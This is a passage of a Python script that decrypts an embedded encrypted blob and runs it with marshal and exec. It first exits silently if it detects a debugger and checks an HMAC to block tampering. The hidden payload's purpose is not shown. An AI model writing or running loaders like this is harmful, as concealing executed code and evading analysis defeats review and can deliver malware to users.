9BcDNHUTdQR2VJSktQUGstMGhCajhWdWZhOUQySjZXLWE2c2VPa253d2pnTzJVNEdGNFJoWURFNEpJRVNtX1U0b01pcEdGUXVtT3FjUDRRXzFfSmtVRDRnR29KbnlMcFZWUEdNUkVKV0Fzd0x5dmdUelByRU0zb3JPZm93c18tQU1lcXVNeW1nMXdhdFNOV3Z6WG9paldpZTJrcC1OME9QalpIS3dkczFyNFJVQmdsZThURGZfVEFUR05NekRoWlhReENkT2dHWUVuT2pzU0ZINndLRUpBMm5DTTdiTi1ESlVGMjdrWUF6eHUxeDVrQjB3T3lnMUJlOTVyMXlnNEtpUTlsUlMtQjJCTXk0UmJra2RpYzN5MmI3ZEh2S1hxcHlMUmVIOVA0NEFKWlgyaERUOHB2UUVfZ2pXaHk1OXpseWV2LTFRQ2lzX1BDa1FyWjVNYm1fX01iMi1wNmRsMklkWHEyVzJ2b2xiV3Y1QWhpTFdnOFZvWWxxRmxsUUZNYmZtX0JQcDlwY1d1TFFXYXFXV1BCbTR1OWNMRnliVHVtOGxidDNWMmZWUUxwOW1jQWtGLWdTRGFtZ2JxVWpvOWtCc0xmaXBxVUhscEJja081VTg2elBHMUdOdEh0R1JZY0FIclRDdWc4UzdUU2Jrc0x6OXphM0g0WmZvUmc5OUxZNHRKandGVk9vZGZ3UTB5UHdma1JwZjNfR0N1Tmo3VVBqQmNyeWJXdldtSXFBU0hOeUZEZG5lTkxGdHI2VGRCdXlyM3hVVy1lMGRYLXdRX0JGcXkweW05YVVEMWd4eHpvbjh6b2ZlWms0Rmo3M3B1UWdVN0piNTBiSnh3eVJ4YTI3ZXhJRWxYWmR6U0NPSTBPYkdhaXcxU3g5Sl92X1hKaTlsd05GanpfaEhHV2k2VXRhcWR2cklOcjVOd0lpd3JTNlIyWUFuM2dOOGhiSzdqcm1UZ0NmUEZhM3lEN1RNSGE0WWlSS3hfMEs0QUd0d21PYkcweFA2V0ZiblNTSGhNNEgydHlfQ2lhVFhQX1dyMWVrcnJYOF9Hd1Z2R0NpVVBLM2JaeXdXUjNndFRaSEdidGo3dGRORjdybEdtU0tQdEczU210QS0xek9SbjZ1UmMwdXljNm5hbmhiMWNlaXlIbmh3eXBTLTZMNGlFUEFadG05dHVydGd5UDgzWVo5V3hTd3hEaWI1YkdsQURDREFvVHJWb0tiMU1KX1J4bTNzempOSjhZOXRpUVVFV1hUY2pyX2ptUEFXUUZhcVkxRHBTQ2VQaUxQUTMxbHcycXJwZTlqUTRnZmRqZTVObEswR3ZZbHRYdWhyZ3dFMXBNM1NELUJLcGZnTzBVZDZndGpIRjdYQWJGenFHME5xMlJ0WndBMGxacmF4ZzZiSEczallOSlFZd01FQ1dCYWpveDJsVno4aTg3S3QwVkxIV3k2cThZeTJwTWp0YjE3b3JtYk91a24zaHZYaElFaUhfcHpzc1FWSU9fRVoxYU9DS21FZUFoMEFVengyS0dmeVJfalNhaGR6V3A0dXJUU0pzcU5VSHBBcVd6SHROellkeFpGNTFHQXhDV1dpS3ZPbkFmV2E2UEJzSkR4TEItSlRVRGx2YjlDWEthcG95MjlJZnlqVERHcVhpY190M1lIY0kxSmVReDQxczl2RGFuSnhTMEVSSUtPT3JQUWdGTEg5elN2NUxSeWpvRFl2UTJsWmhMTVJ4TmJtNTM2dWJ1amtucndNSkRCcU9zeEdLTWtfdmpSVnFCTVRWd0l6Nl9YSklJNkVjbjE2WFFlWkVqUEEtWTJiRFhWOW1tUkprdko0YklEZnk1ejBkbzdDeDhaVzRBTzRiYTM3WTEtRGtPU3hVUjdheE52ank2aDVaZz0="
EXPECTED_HMAC = "d913e145f63203a76eeca8bbf7f9f3b7392f119fbf1b1eb92e3c77e20153fccf"

def check_debugger():
    if getattr(sys, 'gettrace')() is not None:
        return True
    try:
        with open('/proc/self/status', 'r') as f:
            if 'TracerPid:\t0' not in f.read():
                return True
    except Exception:
        pass
    return False

def key_derivation(salt_bytes, passphrase_bytes, iterations):
    xor_key = hashlib.pbkdf2_hmac(
        'sha256', 
        passphrase_bytes + salt_bytes, 
        salt_bytes, 
        iterations, 
        dklen=int(KEY_LEN)
    )
    return xor_key

if check_debugger():
    sys.exit(0)

try:
    PASSPHRASE_BYTES = base64.b64decode(PASSPHRASE_B64)
    
    RANDOM_SALT = base64.b64decode(RANDOM_SALT_B64)
    
    XOR_KEY = key_derivation(RANDOM_SALT, PASSPHRASE_BYTES, ITERATIONS)
    
    obfuscated_key_bytes = bytes.fromhex(OBFUSCATED_FERNET_KEY_HEX)
    FERNET_KEY = bytes([a ^ b for a, b in zip(obfuscated_key_bytes, XOR_KEY)])
    
    if len(FERNET_KEY) != int(KEY_LEN):
        raise ValueError("Key length mismatch after XOR.")
    
    HMAC_KEY = hashlib.sha256(PASSPHRASE_BYTES + RANDOM_SALT + HMAC_KEY_DERIVATION_SALT).digest()
    
    final_cipher = Fernet(FERNET_KEY)

except Exception:
    print("❌ Error Derivasi Kunci: " + str(sys.exc_info()[1]))
    sys.exit(1)


try:
    encrypted_data = base64.b64decode(ENCRYPTED_DATA_B64)

    current_hmac = hmac.new(HMAC_KEY, encrypted_data, hashlib.sha256).hexdigest()
    
    if not hmac.compare_digest(current_hmac, EXPECTED_HMAC):
        print("❌ Deteksi Tampering Data (HMAC Failed). Menghentikan eksekusi.")
        sys.exit(1)
    
    decrypted_data = final_cipher.decrypt(encrypted_data)

    code_object = marshal.loads(decrypted_data)
    getattr(builtins, 'exec')(code_object)

except Exception:
    print("❌ Gagal memulai runtime aman. Kode mungkin rusak atau dimodifikasi.")
    print("DEBUG ERROR: " + str(sys.exc_info()[1]))
    sys.exit(1)
    
